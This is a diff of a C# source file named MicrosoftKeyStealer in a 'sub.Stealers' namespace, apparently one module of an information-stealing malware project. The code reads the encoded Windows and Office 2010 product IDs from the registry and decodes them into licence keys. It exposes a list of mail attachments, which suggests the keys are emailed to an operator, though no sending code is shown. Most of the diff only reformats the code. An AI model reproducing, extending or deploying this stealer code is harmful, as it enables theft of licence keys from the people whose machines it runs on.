@@ -1,16 +1,20 @@
-﻿using System;
+﻿#region Imports
+
 using System.Collections;
 using System.Collections.Generic;
 using System.Net.Mail;
-using System.Text;
-using sub.Util.Misc;
 using Microsoft.Win32;
+using sub.Util.Misc;
+
+#endregion
 
 namespace sub.Stealers
 {
     internal class MicrosoftKeyStealer : IStealer
     {
         private string _name = "ProductKeyStealer";
+
+        #region IStealer Members
 
         public List<Attachment> Attachments { get; set; }
 
@@ -25,12 +29,11 @@ namespace sub.Stealers
         public void Collect()
         {
             byte[] digitalProductId = null;
-            RegistryKey registry = null;
-                    registry = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion", false);
+            RegistryKey registry = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion",
+                                                                    false);
             if (registry != null)
             {
-                digitalProductId = registry.GetValue("DigitalProductId")
-                  as byte[];
+                digitalProductId = (byte[]) registry.GetValue("DigitalProductId");
                 registry.Close();
             }
             byte[] office2010 = null;
@@ -39,20 +42,20 @@ namespace sub.Stealers
                     @"SOFTWARE\Microsoft\Office\14.0\Registration\{90140000-0011-0000-1000-0000000FF1CE}");
             if (registry != null)
             {
-                office2010 = registry.GetValue("DigitalProductId")
-                  as byte[];
+                office2010 = (byte[]) registry.GetValue("DigitalProductId");
                 registry.Close();
             }
             if (digitalProductId != null)
             {
-                Data = "Windows: " + DecodeProductKey(digitalProductId);
+                Data = "Microsoft Windows: " + DecodeProductKey(digitalProductId);
                 if (office2010 != null)
                     Data += "\r\nOffice 2010: " + DecodeProductKey(office2010);
             }
-
         }
 
-        private static string DecodeProductKey(byte[] digitalProductId)
+        #endregion
+
+        private static string DecodeProductKey(IList<byte> digitalProductId)
         {
             // Offset of first byte of encoded product key in 
             //  'DigitalProductIdxxx" REG_BINARY value. Offset = 34H.
@@ -62,10 +65,10 @@ namespace sub.Stealers
             const int keyEndIndex = keyStartIndex + 15;
             // Possible alpha-numeric characters in product key.
             char[] digits = new char[]
-            {
-                'B', 'C', 'D', 'F', 'G', 'H', 'J', 'K', 'M', 'P', 'Q', 'R', 
-                'T', 'V', 'W', 'X', 'Y', '2', '3', '4', '6', '7', '8', '9',
-            };
+                                {
+                                    'B', 'C', 'D', 'F', 'G', 'H', 'J', 'K', 'M', 'P', 'Q', 'R',
+                                    'T', 'V', 'W', 'X', 'Y', '2', '3', '4', '6', '7', '8', '9',
+                                };
             // Length of decoded product key
             const int decodeLength = 29;
             // Length of decoded product key in byte-form.
@@ -82,7 +85,7 @@ namespace sub.Stealers
             for (int i = decodeLength - 1; i >= 0; i--)
             {
                 // Every sixth char is a separator.
-                if ((i + 1) % 6 == 0)
+                if ((i + 1)%6 == 0)
                 {
                     decodedChars[i] = '-';
                 }
@@ -92,9 +95,9 @@ namespace sub.Stealers
                     int digitMapIndex = 0;
                     for (int j = decodeStringLength - 1; j >= 0; j--)
                     {
-                        int byteValue = (digitMapIndex << 8) | (byte)hexPid[j];
-                        hexPid[j] = (byte)(byteValue / 24);
-                        digitMapIndex = byteValue % 24;
+                        int byteValue = (digitMapIndex << 8) | (byte) hexPid[j];
+                        hexPid[j] = (byte) (byteValue/24);
+                        digitMapIndex = byteValue%24;
                         decodedChars[i] = digits[digitMapIndex];
                     }
                 }
